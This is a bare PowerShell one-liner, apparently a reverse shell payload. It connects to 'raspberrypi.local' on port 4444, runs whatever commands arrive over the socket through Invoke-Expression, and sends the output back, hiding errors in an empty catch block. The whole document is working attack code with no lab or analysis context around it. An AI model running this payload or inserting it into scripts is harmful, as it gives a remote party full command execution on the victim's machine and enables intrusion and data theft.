$sm=(New-Object Net.Sockets.TCPClient("raspberrypi.local",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){Try{$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$stdout = [string[]] (iex $d 2>&1);$st = "";foreach($line in $stdout){$st = $st+$line+"\n"}$st=([text.encoding]::ASCII).GetBytes($st);$sm.Write($st,0,$st.Length)}Catch{}}
